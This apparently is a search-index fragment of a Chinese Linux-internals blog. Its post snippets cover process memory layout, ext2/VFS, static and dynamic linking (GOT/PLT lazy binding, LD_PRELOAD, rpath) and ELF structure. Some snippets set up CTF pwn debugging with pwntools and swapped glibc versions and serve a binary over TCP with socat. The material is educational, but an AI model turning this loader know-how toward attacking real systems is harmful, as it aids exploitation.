long shared_vm;\t/* Shared pages (files) */\tunsigned long exec_vm;\t\t/* VM_EXEC &amp; ~VM_WRITE */\tunsigned long stack_vm;\t\t/* VM_GROWSUP/DOWN */\tunsigned long reserved_vm;\t/* VM_RESERVED|VM_IO pages */\tunsigned long def_flags;\tunsigned long nr_ptes;\t\t/* Page table pages */\tunsigned long start_code, end_code, start_data, end_data;\tunsigned long start_brk, brk, start_stack;\tunsigned long arg_start, arg_end, env_start, env_end; ...};栈 先进后出的数据结构 用于函数的局部内存管理 保存非静态局部变量（自动变量） 记录函数调用过程相关的维护性信息 临时存储区，用于暂存长算术表达式部分计算结果或alloca()函数分配的栈内内存 往低地址增长 ebp寄存器又被称为帧指针(Frame Pointer) 索引栈上的参数(x86下，%ebp+8指向第一个参数) 保存栈顶位置%esp(%rsp) 索引局部变量 esp寄存器又被称为栈指针(Stack Pointer) push %ebp -&gt; subl $4,%esp, movl %ebp,(%esp)栈帧 函数的返回地址和参数 临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量 函数调用的上下文堆和栈的区别： 分配和管理方式不同 堆是动态分配的，其空间的分配和释放都由程序员控制。 栈由编译器自动管理。栈有两种分配方式：静态分配和动态分配。 静态分配由编译器完成，比如局部变量的分配。 动态分配由alloca()函数进行分配，但是栈的动态分配和堆是不同的，它的动态分配是由编译器进行释放，无须手工控制。 产生碎片不同 对堆来说，频繁的new/delete或者malloc/free势必会造成内存空间的不连续，造成大量的碎片，使程序效率降低。 对栈而言，则不存在碎片问题，因为栈是先进后出的队列，永远不可能有一个内存块从栈中间弹出。 生长方向不同内存映射段(mmap)内核将硬盘文件的内容直接映射到内存, 任何应用程序都可通过Linux的mmap()系统调用或Windows的CreateFileMapping()/MapViewOfFile()请求这种映射。内存映射是一种方便高效的文件I/O方式， 因而被用于装载动态共享库。用户也可创建匿名内存映射，该映射没有对应的文件, 可用于存放程序数据。进程空间分布图分析工具 getconf PAGE_SIZE 查看系统页大小 getconf LONG_BIT 查看操作系统位数 cat /proc/$(pidof MyPrograme)/maps 查看内存映射情况" }, { "title": "Linux文件系统", "url": "/posts/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/", "categories": "Linux, Basic", "tags": "vfs, fs", "date": "2022-08-16 17:13:00 +0800", "snippet": "磁盘磁盘组成 圆形的磁盘盘(主要记录数据的部分); 机械手臂，与在机械手臂上的磁盘读取头(可擦写磁盘盘上的数据); 主轴马达，可以转动磁盘盘，让机械手臂的读取头在磁盘盘上读写数据。磁盘盘组成 扇区(Sector)为最小的物理储存单位，每个扇区为512 bytes ; 将扇区组成一个圆，那就是磁柱(Cylinder)，磁柱是分割槽(partition)的最小单位 第一个扇区最重要，里面有:主要开机区(Master boot record,MBR)及分割表(partitiontable)，其中 MBR占有446 bytes，而 partition table则占有64 bytes。磁盘分割、格式化、检验与挂载 对磁盘进行分割，以建立可用的partition ; 对该partition进行格式化(format)，以建立系统可用的 filesystem ; 若想要仔细一点，则可对刚刚建立好的filesystem进行检验﹔ 在 Linux系统上，需要建立挂载点（亦即是目录），并将他挂载上来﹔设备文件 /dev/sd[a-p][1-15]:为SCSI, SATA, USB, Flash随身碟等接口的磁盘文件名; /dev/hd[a-d][1-63]:为IDE接口的磁盘文件名;文件系统 传统文件系统:ext2 / minix /MS-DOS /FAT(用vfat模块)/iso9660(光盘)等等 日志式文件系统:ext3 / ReiserFS / Windows’ NTFS /IBM’s JFS / SGI’s XFS 网络文件系统∶NFS / SMBFS日志式文件系统 预备∶当系统要写入一个档案时，会先在日志记录区块中纪录某个档案准备要写入的信息; 实际写入∶开始写入档案的权限与数据;开始更新metadata 的数据; 结束︰完成数据与metadata的更新后，在日志记录区块当中完成该档案的纪录。数据一致性既然有不一致当然就得要克服!在早期的Ext2文件系统中，如果发生这个问题，那么系统在重新启动的时候，就会藉由Superblock当中记录的valid bit(是否有挂载)与filesystem state (clean与否)等状态来判断是否强制进行数据一致性的检查!若有需要检查时则以e2fsck这支程序来进行的。异步处理当系统加载一个档案到内存后，如果该档案没有被更动过，则在内存区段的档案数据会被设定为干净(clean)的。但如果内存中的档案数据被更改过了(例如你用nano去编辑过这个档案)，此时该内存中的数据会被设定为脏的(Dirty)。此时所有的动作都还在内存中执行，并没有写入到磁盘中!系统会不定时的将内存中设定为『Dirty』的数据写回磁盘，以保持磁盘与内存数据的一致性。挂载将文件系统与目录树结合的动作我们称为『挂载』。关于挂载的一些特性我们在第三章稍微提过，重点是∶挂载点一定是目录，该目录为进入该文件系统的入口。文件系统操作/proc的东西都是Linux系统所需要加载的系统数据，而且是挂载在『内存当中』的，不会占用磁盘空间/dev/shm/是利用内存虚拟出来的磁盘空间ext2文件系统结构启动扇区(boot sector)在整体的规划当中，文件系统最前面有一个启动扇区(boot sector)，这个启动扇区可以安装开机管理程序，这是个非常重要的设计，因为如此一来我们就能够将不同的开机管理程序安装到个别的文件系统最前端，而不用覆盖整颗硬盘唯一的 MBR，这样也才能够制作出多重引导的环境啊!超级块(Super Block)描述整个分区的文件系统信息。超级块在每个块组的开头都有一份拷贝（第一个块组必须有，后面的块组可以没有）。超级块记录的信息有： block 与 inode 的总量（分区内所有Block Group的block和inode总量）； 未使用与已使用的 inode / block 数量； block 与 inode 的大小 (block 为 1, 2, 4K，inode 为 128 bytes)； filesystem 的挂载时间、最近一次写入数据的时间、最近一次检验磁盘 (fsck) 的时间等文件系统的相关信息； 一个 valid bit 数值，若此文件系统已被挂载，则 valid bit 为 0 ，若未被挂载，则 valid bit 为 1 。块组描述符表(GDT,Group Descriptor Table)由很多块组描述符组成，整个分区分成多个块组就对应有多少个块组描述符。每个块组描述符存储一个块组的描述信息，如在这个块组中从哪里开始是inode Table，从哪里开始是 Data Blocks，空闲的inode和数据块还有多少个等等。块组描述符在每个块组的开头都有一份拷贝。块位图(Block Bitmap)用来描述整个块组中哪些块已用哪些块空闲。块位图本身占一个块，其中的每个bit代表本块组的一个block，这个bit为1代表该块已用，为0表示空闲可用。假设格式化时block大小为1KB，这样大小的一个块位图就可以表示1024*8个块的占用情况，因此一个块组最多可以有10248个块。inode位图(inode Bitmap)和块位图类似，本身占一个块，其中每个bit表示一个inode是否空闲可用。 Inode bitmap的作用是记录block group中Inode区域的使用情况，Ext文件系统中一个block group中可以有16384个Inode，代表着这个Ext文件系统中一个block group最多可以描述16384个文件。inode表(inode Table)由一个块组中的所有inode组成。一个文件除了数据需要存储之外，一些描述信息也需要存储，如文件类型，权限，文件大小，创建、修改、访问时间等，这些信息存在inode中而不是数据块中。inode表占多少个块在格式化时就要写入块组描述符中。data block可能和Inode同属于一个block group也可能分属于不同的block group。12个直接、1个一级间接、1个二级间接、1个三级间接数据块(Data Block)是用来放置文件内容数据的地方。 普通文件：数据存储在数据块中。 目录：该目录下的所有文件名、目录名和inode号码存储在该目录inode关联的数据块中， 符合链接：如果目标路径名较短则直接保存在inode中，如果较长则分配一个数据块来保存。 Block大小 1KB 2KB 4KB 最大单一文件限制 16GB 256GB 2TB 最大文件系统总容量 2TB 8TB 16TB VFS(Virtual Filesystem Switch)整个Linux的系统都是透过一个名为Virtual Filesystem Switch 的核心功能去读取filesystem的。也就是说，整个 Linux认识的 filesystem 其实都是VFS在进行管理，我们使用者并不需要知道每个partition上头的 filesystem 是什么。链接 Hard Links： 为已存在的文件，新建一个指向该文件inode节点的目录项（directory entry），同时增加该inode的连接数。可以让一个文件有多个硬链接，出现在多个目录下。Hard link一般有两个限制： 不能跨文件系统（不同的文件系统有不同的inode table）； 不能连接目录（容易在文件系统中造成循环引用）。 Symbolic Links：跟hard link不同，它是建立一个独立的文件，而这个文件的作用是当读取这个连接文件时，它会把读取的行为转发到该文件所link的文件上。这样讲，也许比较绕口，那么就来举一个例子。现在有文件a，我们做了一个软连接文件b（只是一个连接文件，非常小），b指向了文件a。当读取b时，那么b就会把读取的动作转发到a上，这样就读取到了文件a。所以，当你删除文件a时，文件b并不会被删除，但是再读取b时，会提示无法打开文件。而当你删除b时，a是不会有任何影响的。缓冲区缓冲区又称为缓存，它是内存空间的一部分。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。 一般缓冲区大小4096B缓冲区类型 全缓冲：当填满标准I/O缓存后才进行实际I/O操作。全缓冲的典型代表是对磁盘文件的读写。 行缓冲：我们输入的字符先存放在缓冲区，当在输入和输出中遇到换行符时，执行真正的I/O操作。典型代表是键盘输入数据。 不带缓冲：也就是不进行缓冲，标准出错情况stderr是典型代表。 标准输入 标准输出 标准错误 0 1 2 缓冲区刷新刷新缓冲区，为执行I/O操作，并非清空缓冲区 缓冲区满 执行flush语句 执行endl语句 关闭文件常用工具 dumpe2fs 每个区段与 superblock 的信息 e2fsck 数据一致性 sync 手动同步 df 列出文件系统的整体磁盘使用量 du 评估文件系统的磁盘使用量(常用在推估目录所占容量) fdisk 磁盘分区 mkfs 文件系统格式化，mkfs命令本身并不执行建立文件系统的工作，而是去调用相关的程序来执行 mke2fs 在磁盘分区上创建ext2、ext3、ext4文件系统 fsck 文件系统检查 badblocks 硬盘坏轨检测 ln 软硬链接" }, { "title": "程序编译与链接", "url": "/posts/%E7%A8%8B%E5%BA%8F%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5/", "categories": "Linux, Basic", "tags": "elf", "date": "2022-08-15 19:19:00 +0800", "snippet": " [] 重新梳理静态链接三连音(triplet)即isa-os-libc组成的短语，描述了程序运行需要的基本条件。例如我们最常见的x86_64-linux-gnu三连音。 构建 构建编译器的平台的三连音。 宿主 编译器运行平台的三连音。 目标 编译器编译出来的程序平台的三连音。基于构建、宿主和目标的关系又可以定义本地编译和交叉编译等概念编译过程编译过程链接过程 将多个目标文件、库文件中的代码、数据等信息合并 修复文件之间的引用关系 生成可执行程序 静态库中的代码和数据会完整拷贝到可执行程序中，而动态库则需要在程序运行时通过动态链接的方式加载静态函数库和动态函数库 libname.so.x.y.z lib表明是共享库，name为共享库名称。so为固定后缀，x、y和z分别代表主版本号、次版本号和发行版本号 静态函数库(static libraries)、共享函数库(shared libraries)、动态加载函数库(dynamically loaded libraries) 静态函数库linux后缀.a，windows后缀.lib 动态函数库同共享函数库是一个东西（在linux上叫共享对象库，文件后缀是 .so/shared object，windows上叫动态加载函数库，文件后缀是.dll/dynamic link library），一般在虚拟地址空间的映射基址固定，会受系统版本和补丁影响加载基址和动态库内容 GNU标准建议所有的函数库文件都放在/usr/local/lib目录下，而且建议命令可执行程序都放在/usr/local/bin目录下。 文件系统层次化标准FHS（Filesystem Hierarchy Standard）规定了在一个发行包中大部分的函数库文件应该安装到/usr/lib目录下，但是如果某些库是在系统启动的时候要加载的，则放到/lib目录下，而那些不是系统本身一部分的库则放到/usr/local/lib下面。 标准库：libc.so.6(/lib/x86_64-linux-gnu)静态链接过程(Static Linking)静态链接启动过程动态链接过程(Dynamic Linking)$ gcc -shared -fPIC -o mydll.dll mydll.c # 生成dll$ gcc -o usedll usedll.c mydll.dll # 调用dll# export LD_LIBRARY_PATH=. &amp;&amp; gcc usedll.c -L. -l function # 指定目录调用dll 动态链接 运行时才会加载和链接程序所依赖的共享库的计数 Linux最常见的共享库是libc 重定位(Relocations) 指二进制文件中的待填充项 链接器在链接时填充，链接多个目标文件时，修正相互引用的函数、变量地址 动态链接器在运行时填充，例如动态解析库函数printf 动态链接中的延迟绑定 外部函数的地址在运行时才会确定 外部函数符号通常在首次调用时才会被解析 外部变量不使用延迟绑定机制 动态链接启动过程Position Independent Code(PIC) 由编译器提供 针对linux共享库 添加 -fPIC 选项生成的动态库，是位置无关。这样的代码本身就能被放到线性地址空间的任意位置，无需修改就能正确执行 添加 -fPIC 选项实现真正意义上的多个进程共享.so库 不添加 -fPIC 选项，加载.so库时，需要对代码段引用的数据对象重定位，重定位会修改代码段的内容，造成每个使用这个.so文件代码段的进程在内核里都会生成这个.so文件代码段的copy 在数据段开始的地方创建了一个GOT表，编译器还会为GOT表中每个条目生成一个重定位记录，加载时动态链接器重定位GOT中每个条目，使得它们包含目标的正确绝对地址。lazy binding延迟绑定要求got.plt可写，在程序加载时不会向got表填入地址，而是在运行时动态解析。PLT0:0x080482d0 pushl 0x804a004 # link_map(GOT1)地址作为参数入栈0x080482d6 jmp *0x804a008 # 跳转GOT2即_dl_runtime_resolve函数PLT1:0x080482e0 &lt;puts@plt&gt; jmp *0x804a00c # 跳转到GOT表给定的地址0x080482e6 &lt;puts@plt+6&gt; push $0x0 # reloc_arg作为参数入栈0x080482eb &lt;puts@plt+11&gt; jmp 0x80482d0 # 跳转PLT0继续执行GOT0:0x804a000 0x08049f14 # 存放.dynamic section地址GOT1:0X804a004 0xf7ffd8f8 # 存放link_map地址GOT2:0x804a008 0xf7fedaa0 # 存放_dl_runtime_resolve函数地址GOT3:0x804a00c 0x080482e6 # 第一次跳转回PLT表下一条指令地址，解析后保存函数的真实地址 调用函数时通过puts@plt到达对应PLT表项 PLT表项第一条指令跳转至对应GOT表项给出的地址 第一次调用时，GOT表项给出的地址为PLT表项下一条指令 PLT随后将reloc_arg和link_map依次入栈并调用_dl_runtime_resolve函数 解析完成后GOT表项被填充为puts函数真实地址，不再指向PLT下一条指令延迟绑定过程调试不同版本glibc动态库加载流程 程序加载的时候，首先进去的不是_start处的代码，而是先加载执行PT_INTERP指向的程序即ld，ld位置在编译时写好，通过readelf -l ./myProg查看 之后ld会加载程序中需要的依赖库，通过readelf -d ./myProg查看，依赖库有时给出完整路径，有时只给出文件名 对于依赖库的搜索，遵循以下顺序 程序libc字段指定路径 可执行文件编译时由-rpath指定的动态库路径查找 LD_LIBRARY_PATH环境变量指定的路径查找 ldconfig的配置文件指定的路径查找：/etc/ld.so.conf（或/usr/local/etc/ld.so.conf） 默认路径查找: /lib 默认路径查找: /usr/lib LD_PRELOAD环境变量使程序运行时，ld加载指定动态库，该变量会最先加载某动态库，优先级高覆盖同名动态库。 加载完毕后执行程序代码 Linux程序动态库的加载 LD_PRELOAD用法-L, -rpath, -rpath-link -rpath和-rpath-link都可以在链接时指定库的路径； 运行可执行文件时，-rpath-link指定的路径不再有效(链接器没有将库的路径包含进可执行文件中)，而-rpath指定的路径还有效(因为链接器已经将库的路径包含在可执行文件中)； -L指定的是链接时的库路径，生成的可执行文件在运行时库的路径仍由LD_LIBRARY_PATH环境变量指定； 不管采用何种选项链接，当提示找不到动态库时均可通过设置LD_LIBRARY_PATH解决。 当明确知道动态库的绝对路径时 gcc test.c -o test -Wl,-rpath,/usr/local/mylib/ -lfoo 当仅知道动态库相对于可执行文件的相对路径时，使用$ORIGIN代表可执行文件路径 gcc test.c -o test -Wl,-rpath,'$$ORIGIN/../mylib' -lfoo -L、-rpath和-rpath-link的区别 使用rpath解决指定动态库链接目录问题修改文件内ld和libc路径由于libc依赖于ld，所以通常需要将两者一同更换。$ ldd /lib/i386-linux-gnu/libc.so.6 /lib/ld-linux.so.2 (0xf7f76000) linux-gate.so.1 (0xf7f74000)通过工具或手动修改ld时都需要注意不能破坏程序的结构，也就是说ld路径不应该比原程序给定的长。修改ld有以下方法 直接修改elf文件内ld路径字段 通过patchelf –set-interpreter选项修改elf文件ld路径字段修改libc有以下方法 直接修改elf文件内libc路径字段 patchelf –replace-needed选项修改elf文件依赖库字段 patchelf –set-rpath修改ld的run path字段，该字段通过readelf -d可查看 关于不同版本glibc强行加载的方法 关于不同版本 glibc 更换的一些问题利用pwntools和glibc-all-in-oneio = process(['/root/pwn-workplace/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/ld-2.21.so', './test'], env={\"LD_PRELOAD\":'/root/pwn-workplace/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6'})编译glibc给出64位的方法，32位见引用$ cd /home/allforyou/local_glibc_source$ mkdir build$ cd build$ CFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\"$ CXXFLAGS=\"-g -g3 -ggdb -gdwarf-4 -Og\"$ ../configure --prefix=/home/allforyou/local_glibc/glibc-2.23 --enable-debug=yes$ sudo make &amp;&amp; make install注意enable-debug选项，带调试符的才能正确通过pwndbg调试 Linux中进行glibc源码调试的一种方法 在 Arch Linux 下使用 glibc 2.23 调试程序&amp;使用 pwndbg加载glibc符号符号信息需要放在.debug文件夹内，.debug文件夹需要和库文件放在同一目录下。如果没放在一起的话，gdb内无论如何都不能将符号和库绑定，暂未知道解决的方法。set debug-file-directory $dir.debug文件夹所在目录set solib-search-path $dir动态库搜索路径，会参考debug-file-directory搜索符号信息info sharedlibrary查看动态库加载地址和符号信息add-symbol-file $file $addr添加单一的符号文件 关于不同版本 glibc 更换的一些问题 需要在GDB中为共享库加载调试符号 set solib-search-path command分析工具 socat Socat是Linux下的一个多功能的网络工具，名字来由是Socket CAT。其功能与有瑞士军刀之称的 Netcat 类似，可以看做是Netcat的加强版。Socat的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如IP、TCP、UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket等。socat tcp-l:端口号，fork exec:程序位置，reuseaddr nohup nohup是no hang up的缩写，就是不挂断的意思，忽略所有挂断（SIGHUP）信号。在注销后使用nohup命令运行后台中的程序。要运行后台中的nohup命令，添加&amp;（ 表示“and”的符号）到命令的尾部。nohup socat tcp-l:端口号，fork exec:程序位置，reuseaddr &amp; ** ldd 依赖库信息 ltrace 库调用跟踪器，打印二进制程序正在使用的库函数 strace 跟踪系统调用和信号 ar 用来创建、修改库，也可以从库中提出单个模块，用ar工具可将众多.o归档为.a静态库文件。Reference 编译器的构建基本原理 编译技术概览 C++ 联编、编译、链接、绑定 Return-to-dl-resolve dl-resolve浅析 CTF pwn中利用pwntools加载不同版本libc调试程序的方法 《链接器和加载器》" }, { "title": "ELF文件解析", "url": "/posts/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/", "categories": "Linux, Basic", "tags": "elf", "date": "2022-08-15 13:57:00 +0800", "snippet": "ELF(Executable and Linkable Format) 格式定义: /usr/include/elf.h 内核中相关处理代码: fs/binfmt_elf.c本文针对ELF 32-bit进行讲解 Linux下常用的可执行文件、可重定位文件、共享库和核心转储(core dump)的标准文件格式 其他平台可执行文件格式：PE、Mach-O、COFF、COM 对象文件/目标文件(obejctive file) loader只加载可执行文件 可执行的对象文件(ET_EXEC) 可直接运行的程序，必须包含Segment。 可重定位的对象文件(ET_REL, *.o, *.a) 需要与其它对象文件链接成可执行文件或共享文件，必须包含Section，静态链接库也属于此类。用ar工具可将众多.o归档为.a静态库文件。 可被共享的对象文件(ET_DYN, *.so) 与其他对象文件/可执行文件链接，必须同时包含Segment和Section 核心转储文件(ET_CORE, core dump) 进程意外中止时保存相关信息《CTF all in one》中编译的三种文件分别属于relocatable、shared object和executable$ file elfDemo.oelfDemo.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped$ file elfDemo.outelfDemo.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=449104f371131705d7828a5886ff8760bda78d68, for GNU/Linux 3.2.0, not stripped$ file elfDemo_static.outelfDemo_static.out: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=fc554e5541196a56bc66f48dc1d2dcf247faaffe, for GNU/Linux 3.2.0, not stripped结构框架ELF整体结构ELF文件由ELF header、Program header table、Section header table和众多节组成，当我们在进行链接的时候以Section为单位进行组织，而执行的时候以Segment为单位进行组织。ELF关系示意通过ELF header可以检索Program header table和Section header本节主要介绍Section和Segment的概念。Segment 告诉内核，执行ELF文件时应该如何映射内存 每个Segment主要包含加载地址、文件中的范围、内存权限、对齐方式等信息 运行时必须提供的信息Section section直接对应汇编代码的一段 告诉链接器，ELF中每个部分是什么，代码、只读数据、重定位信息等的位置 每个Section主要包含Section类型，文件中的位置、大小等信息 链接器依赖Section信息将不同的对象文件的代码、数据信息合并，并修复互相引用需要注意的是Program header table在链接时是可以省略的，并不是必须的。同理，Section header table在执行时也是这样。两者的关系 系统会将相同权限的Section会放入同一个Segment，例如.text和.rodata section。 系统内存的权限管理的粒度是以页为单位，页内的内存是具有同样的权限等属性，并且操作系统对内存的管理往往追求高效和高利用率，将多个section合并在一起减少内部碎片 一个Segment包含许多Section，一个Section可以属于多个Segment 程序分段的好处 进程运行过程中，代码指令根据流程依次执行，只需访问一次(当然跳转和递归可能使代码执行多次)；而数据(数据段和BSS段)通常需要访问多次，因此单独开辟空间以方便访问和节约空间。具体解释如下：当程序被装载后，数据和指令分别映射到两个虚存区域。数据区对于进程而言可读写，而指令区对于进程只读。两区的权限可分别设置为可读写和只读。以防止程序指令被有意或无意地改写。现代CPU具有极为强大的缓存(Cache)体系，程序必须尽量提高缓存命中率。指令区和数据区的分离有利于提高程序的局部性。现代CPU一般数据缓存和指令缓存分离，故程序的指令和数据分开存放有利于提高CPU缓存命中率。当系统中运行多个该程序的副本时，其指令相同，故内存中只须保存一份该程序的指令部分。若系统中运行数百进程，通过共享指令将节省大量空间(尤其对于有动态链接的系统)。其他只读数据如程序里的图标、图片、文本等资源也可共享。而每个副本进程的数据区域不同，它们是进程私有的。此外，临时数据及需要再次使用的代码在运行时放入栈区中，生命周期短。全局数据和静态数据可能在整个程序执行过程中都需要访问，因此单独存储管理。堆区由用户自由分配，以便管理。ELF Header位于文件开始处，用来描述文件的组织。typedef struct{ unsigned char\te_ident[EI_NIDENT];\t/* Magic number and other info */ Elf32_Half\te_type;\t\t\t/* Object file type */ Elf32_Half\te_machine;\t\t/* Architecture */ Elf32_Word\te_version;\t\t/* Object file version */ Elf32_Addr\te_entry;\t\t/* Entry point virtual address */ Elf32_Off\te_phoff;\t\t/* Program header table file offset */ Elf32_Off\te_shoff;\t\t/* Section header table file offset */ Elf32_Word\te_flags;\t\t/* Processor-specific flags */ Elf32_Half\te_ehsize;\t\t/* ELF header size in bytes */ Elf32_Half\te_phentsize;\t\t/* Program header table entry size */ Elf32_Half\te_phnum;\t\t/* Program header table entry count */ Elf32_Half\te_shentsize;\t\t/* Section header table entry size */ Elf32_Half\te_shnum;\t\t/* Section header table entry count */ Elf32_Half\te_shstrndx;\t\t/* Section header string table index */} Elf32_Ehdr;其中一些比较重要的信息是ELF文件的位数、ABI版本信息以及机器信息。$ readelf -h elfDemo.outELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x1090 Start of program headers: 52 (bytes into file) Start of section headers: 14536 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 12 Size of section headers: 40 (bytes) Number of section headers: 31 Section header string table index: 30Program Header Table 告诉系统如何创建进程映像 程序头部仅对于可执行文件和共享目标文件有意义，可重定位文件不需要 可执行文件或者共享目标文件的程序头部是一个结构数组，每个结构描述了一个段 或者系统准备程序执行所必需的其它信息。/* Program Header */typedef struct {\tElf32_Word\tp_type;\t\t/* segment type */\tElf32_Off\tp_offset;\t/* segment offset */\tElf32_Addr\tp_vaddr;\t/* virtual address of segment */\tElf32_Addr\tp_paddr;\t/* physical address - ignored? */\tElf32_Word\tp_filesz;\t/* number of bytes in file for seg. */\tElf32_Word\tp_memsz;\t/* number of bytes in mem. for seg. */\tElf32_Word\tp_flags;\t/* flags */\tElf32_Word\tp_align;\t/* memory alignment */} Elf32_Phdr;$ readelf -l elfDemo.outElf file type is DYN (Shared object file)Entry point 0x1090There are 12 program headers, starting at offset 52Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00180 0x00180 R 0x4 INTERP 0x0001b4 0x000001b4 0x000001b4 0x00013 0x00013 R 0x1 [Requesting program interpreter: /lib/ld-linux.so.2] LOAD 0x000000 0x00000000 0x00000000 0x003f8 0x003f8 R 0x1000 LOAD 0x001000 0x00001000 0x00001000 0x002f4 0x002f4 R E 0x1000 LOAD 0x002000 0x00002000 0x00002000 0x001bc 0x001bc R 0x1000 LOAD 0x002ed8 0x00003ed8 0x00003ed8 0x00138 0x00144 RW 0x1000 DYNAMIC 0x002ee0 0x00003ee0 0x00003ee0 0x000f8 0x000f8 RW 0x4 NOTE 0x0001c8 0x000001c8 0x000001c8 0x00060 0x00060 R 0x4 GNU_PROPERTY 0x0001ec 0x000001ec 0x000001ec 0x0001c 0x0001c R 0x4 GNU_EH_FRAME 0x00200c 0x0000200c 0x0000200c 0x0005c 0x0005c R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 GNU_RELRO 0x002ed8 0x00003ed8 0x00003ed8 0x00128 0x00128 R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.gnu.build-id .note.gnu.property .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt 03 .init .plt .plt.got .plt.sec .text .fini 04 .rodata .eh_frame_hdr .eh_frame 05 .init_array .fini_array .dynamic .got .data .bss 06 .dynamic 07 .note.gnu.build-id .note.gnu.property .note.ABI-tag 08 .note.gnu.property 09 .eh_frame_hdr 10 11 .init_array .fini_array .dynamic .gotSection Header Table 包含了描述文件节区的信息 用于链接的目标文件必须包含节区头部表 目标文件中的每个节区都有对应的节区头部描述它，反过来，有节区头部不意 味着有节区。 每个节区占用文件中一个连续字节区域(这个区域可能长度为 0)。 文件中的节区不能重叠，不允许一个字节存在于两个节区中的情况发生。 目标文件中可能包含非活动空间(INACTIVE SPACE)。这些区域不属于任何头部和节区，其内容指定。 以“.”开头的节区名称是系统保留的。应用程序可以使用没有前缀的节区名称，以避 免与系统节区冲突。 目标文件格式允许人们定义不在上述列表中的节区。 目标文件中也可以包含多个名字相同的节区。 保留给处理器体系结构的节区名称一般构成为:处理器体系结构名称简写 + 节区名称。 处理器名称应该与 e_machine 中使用的名称相同。例如 .FOO.psect 街区是由FOO 体系结构定义的 psect 节区。typedef struct{ Elf32_Word\tsh_name;\t\t/* Section name (string tbl index) */ Elf32_Word\tsh_type;\t\t/* Section type */ Elf32_Word\tsh_flags;\t\t/* Section flags */ Elf32_Addr\tsh_addr;\t\t/* Section virtual addr at execution */ Elf32_Off\tsh_offset;\t\t/* Section file offset */ Elf32_Word\tsh_size;\t\t/* Section size in bytes */ Elf32_Word\tsh_link;\t\t/* Link to another section */ Elf32_Word\tsh_info;\t\t/* Additional section information */ Elf32_Word\tsh_addralign;\t\t/* Section alignment */ Elf32_Word\tsh_entsize;\t\t/* Entry size if section holds table */} Elf32_Shdr;$ readelf -S elfDemo.outThere are 31 section headers, starting at offset 0x38c8:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 000001b4 0001b4 000013 00 A 0 0 1 [ 2] .note.gnu.build-i NOTE 000001c8 0001c8 000024 00 A 0 0 4 [ 3] .note.gnu.propert NOTE 000001ec 0001ec 00001c 00 A 0 0 4 [ 4] .note.ABI-tag NOTE 00000208 000208 000020 00 A 0 0 4 [ 5] .gnu.hash GNU_HASH 00000228 000228 000020 04 A 6 0 4 [ 6] .dynsym DYNSYM 00000248 000248 000080 10 A 7 1 4 [ 7] .dynstr STRTAB 000002c8 0002c8 00009d 00 A 0 0 1 [ 8] .gnu.version VERSYM 00000366 000366 000010 02 A 6 0 2 [ 9] .gnu.version_r VERNEED 00000378 000378 000030 00 A 7 1 4 [10] .rel.dyn REL 000003a8 0003a8 000040 08 A 6 0 4 [11] .rel.plt REL 000003e8 0003e8 000010 08 AI 6 24 4 [12] .init PROGBITS 00001000 001000 000024 00 AX 0 0 4 [13] .plt PROGBITS 00001030 001030 000030 04 AX 0 0 16 [14] .plt.got PROGBITS 00001060 001060 000010 10 AX 0 0 16 [15] .plt.sec PROGBITS 00001070 001070 000020 10 AX 0 0 16 [16] .text PROGBITS 00001090 001090 000249 00 AX 0 0 16 [17] .fini PROGBITS 000012dc 0012dc 000018 00 AX 0 0 4 [18] .rodata PROGBITS 00002000 002000 00000c 00 A 0 0 4 [19] .eh_frame_hdr PROGBITS 0000200c 00200c 00005c 00 A 0 0 4 [20] .eh_frame PROGBITS 00002068 002068 000154 00 A 0 0 4 [21] .init_array INIT_ARRAY 00003ed8 002ed8 000004 04 WA 0 0 4 [22] .fini_array FINI_ARRAY 00003edc 002edc 000004 04 WA 0 0 4 [23] .dynamic DYNAMIC 00003ee0 002ee0 0000f8 08 WA 7 0 4 [24] .got PROGBITS 00003fd8 002fd8 000028 04 WA 0 0 4 [25] .data PROGBITS 00004000 003000 000010 00 WA 0 0 4 [26] .bss NOBITS 00004010 003010 00000c 00 WA 0 0 4 [27] .comment PROGBITS 00000000 003010 00002b 01 MS 0 0 1 [28] .symtab SYMTAB 00000000 00303c 0004b0 10 29 48 4 [29] .strtab STRTAB 00000000 0034ec 0002c1 00 0 0 1 [30] .shstrtab STRTAB 00000000 0037ad 000118 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific)索引为零（SHN_UNDEF）的节区头部是存在的，尽管此索引标记的是未定义的节区应用，详见《CTF all in one》Sectiondynsym .dynsym节区包含了动态链接符号表 Elf32_Sym保存外部函数索引值 外部函数的索引值为ELF32_R_SYM(r_info) 